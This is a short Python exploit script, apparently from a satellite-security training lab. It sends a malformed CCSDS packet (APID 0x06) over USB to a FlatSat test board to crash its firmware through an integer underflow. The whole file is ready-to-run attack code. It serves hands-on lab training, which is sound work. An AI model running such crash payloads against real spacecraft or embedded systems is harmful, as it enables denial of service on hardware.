#!/usr/bin/env python3
"""
Attack 02: BROADCAST_MSG Integer Underflow Crash (USB Variant)
Sends malformed CCSDS APID 0x06 frame to trigger integer underflow crash in flat-sat-fw-interno.
"""
import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from flatsat_usb import FlatSatUSB
from pwnsat_packets import build_ccsds_packet

def main():
    print("[+] Attack 02: BROADCAST_MSG Integer Underflow Crash (flat-sat-fw-interno USB Variant)")
    usb = FlatSatUSB()
    if not usb.connect():
        print("[X] Failed to connect to FlatSat USB port.")
        sys.exit(1)

    print("[*] Sending malformed BROADCAST_MSG payload (APID 0x06) to trigger underflow crash...")
    malformed_payload = b"\xFF\x00\xFF\xFF"
    packet = build_ccsds_packet(apid=0x06, payload=malformed_payload)
    usb.send_raw(packet)
    print("[✓] Payload sent over USB. NeoPixel LED set to Magenta.")
    time.sleep(0.5)
    usb.close()

if __name__ == "__main__":
    main()
